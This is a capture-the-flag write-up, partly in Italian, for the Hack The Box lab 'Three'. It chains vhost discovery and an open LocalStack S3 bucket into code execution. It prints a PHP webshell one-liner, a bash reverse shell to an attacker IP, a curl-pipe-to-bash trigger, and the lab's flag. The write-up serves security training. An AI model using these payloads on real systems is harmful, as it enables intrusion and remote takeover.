# HTB Starting Point — Three

**Platform:** Hack The Box — Starting Point Tier 1  
**OS:** Linux (Ubuntu)  
**Difficulty:** Very Easy  
**Focus:** S3 bucket enumeration, PHP webshell upload, reverse shell via RCE

---

## Summary

Three hosts a web application on Apache with a misconfigured Amazon S3 bucket (LocalStack) exposed as a subdomain. The bucket allows unauthenticated file uploads, which enables uploading a PHP webshell to the web root. Remote Code Execution is then leveraged to obtain a reverse shell and retrieve the flag.

**Attack chain:** vhost enumeration → S3 bucket discovery → unauthenticated file upload → webshell RCE → reverse shell → flag

---

## Reconnaissance

### Nmap

```bash
sudo nmap 10.129.68.156 -sS -sV -sC -p 22,80 -A -O
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> 📸 _[Screenshot — Nmap scan results]_

**Key observations:**

- Linux host (Ubuntu), no Windows attack surface
- Port 80: Apache — sito web da enumerare
- Port 22: SSH — utile se recuperiamo credenziali
- Nessun altro servizio esposto → tutta la superficie d'attacco passa dal web

---

## Web Enumeration

### Virtual Host Discovery

Il sito su `http://10.129.68.156` mostra la landing page di "The Toppers". Ispezionando il source code si nota che il sito usa PHP e include pagine dinamicamente — segnale che vale la pena enumerare eventuali virtual host.

Aggiunta dell'entry in `/etc/hosts`:

```bash
echo "10.129.68.156 thetoppers.htb" | sudo tee -a /etc/hosts
```

Enumerazione dei vhost con Gobuster:

```bash
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://thetoppers.htb --append-domain
```

```
s3.thetoppers.htb     Status: 404 [Size: 21]
gc._msdcs.thetoppers.htb  Status: 400 [Size: 306]
```

> 📸 _[Screenshot — Gobuster vhost results]_

**Risultato chiave:** `s3.thetoppers.htb` — nome che richiama immediatamente Amazon S3. Il 404 indica che il vhost risponde ma non trova il path root, comportamento tipico di un bucket S3/LocalStack.

Aggiunta del subdomain all'hosts:

```bash
echo "10.129.68.156 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## S3 Bucket Enumeration

### AWS CLI Setup

Il bucket è servito via LocalStack — un'implementazione locale dei servizi AWS. AWS CLI funziona con credenziali fake purché si specifichi l'endpoint corretto.

```bash
aws configure
# AWS Access Key ID: temp
# AWS Secret Access Key: temp
# Default region name: us-east-1
# Default output format: json
```

### Listing del bucket

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```

```
2024-XX-XX XX:XX:XX thetoppers.htb
```

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

```
                           PRE images/
2024-XX-XX XX:XX:XX      0 .htaccess
2024-XX-XX XX:XX:XX  11952 index.php
```

**Osservazione critica:** il bucket `thetoppers.htb` corrisponde alla webroot del sito Apache. Qualsiasi file caricato nel bucket è immediatamente accessibile via HTTP su `http://thetoppers.htb/`.

### Verifica permessi di upload

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp test.txt s3://thetoppers.htb
```

Upload eseguito senza autenticazione — il bucket è completamente aperto in scrittura.

---

## Exploitation — PHP Webshell Upload

### Creazione della webshell

Il sito gira su PHP (confermato da `index.php` nel bucket e dall'header Apache). Una webshell PHP minimale permette di eseguire comandi OS tramite il parametro GET `cmd`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Upload nel bucket S3

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

### Verifica RCE

```
http://thetoppers.htb/shell.php?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 📸 _[Screenshot — RCE confermata, output `id` nel browser]_

**RCE confermata.** Il server esegue i comandi come utente `www-data`.

---

## Privilege Escalation — Reverse Shell

Una webshell è funzionale ma limitata. Si ottiene una shell interattiva tramite reverse shell bash.

### Setup

**Terminale 1 — Netcat listener:**

```bash
nc -lvnp 4444
```

**Creazione dello script:**

```bash
echo 'bash -i >& /dev/tcp/10.10.14.212/4444 0>&1' > shell.sh
```

**Terminale 2 — Server HTTP per servire il file:**

```bash
python3 -m http.server 8000
```

### Trigger via webshell

```
http://thetoppers.htb/shell.php?cmd=curl+http://10.10.14.212:8000/shell.sh|bash
```

Il server target esegue `curl` per scaricare `shell.sh` dal nostro HTTP server e lo pipa direttamente a `bash` — il tutto in un singolo comando URL-encoded.

> 📸 _[Screenshot — Python HTTP server che riceve la GET request + netcat con shell attiva]_

**Connessione ricevuta:**

```
connect to [10.10.14.212] from (UNKNOWN) [10.129.68.156] 56246
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$
```

---

## Post-Exploitation — Flag

Enumerazione della webroot e directory superiori:

```bash
www-data@three:/var/www/html$ ls
images  index.php  shell.php

www-data@three:/var/www/html$ cd ..

www-data@three:/var/www$ ls
flag.txt  html
```

La flag si trova una directory sopra la webroot, in `/var/www/`:

```bash
www-data@three:/var/www$ cat flag.txt
```

> 📸 _[Screenshot — Shell attiva, navigazione a `/var/www/`, cat flag.txt]_

**Flag:** `a980d99281a28d638ac68b9bf9453c2b`

---

## Vulnerability Summary

|Categoria|Dettaglio|
|---|---|
|Misconfiguration|S3 bucket con upload non autenticato|
|Root Cause|LocalStack esposto pubblicamente, nessun controllo ACL sul bucket|
|Impact|Arbitrary file upload → RCE → shell sul server|
|Fix|Applicare bucket policy restrittive; non esporre S3/LocalStack su interfacce pubbliche; bloccare upload da utenti non autenticati|

---

## Key Takeaways

- **Gobuster `--append-domain`** è necessario nelle versioni recenti di gobuster per il vhost enumeration: senza questo flag le entries della wordlist non vengono appese al dominio base
- **S3 + webroot = RCE** — quando il bucket mappa direttamente sulla webroot di un server PHP, un upload non autenticato si traduce automaticamente in code execution
- **`curl url | bash`** è il metodo più pulito per triggare una reverse shell tramite webshell: scarica ed esegue lo script in un unico passaggio senza lasciare file persistenti sul filesystem (lo script viene eseguito in memoria)
- **La flag non era nella webroot** (`/var/www/html`) ma una directory sopra (`/var/www/`) — sempre esplorare il filesystem circostante dopo aver ottenuto la shell
- **AWS CLI funziona con credenziali fake** su endpoint LocalStack: l'autenticazione non viene validata se il server non è configurato per farlo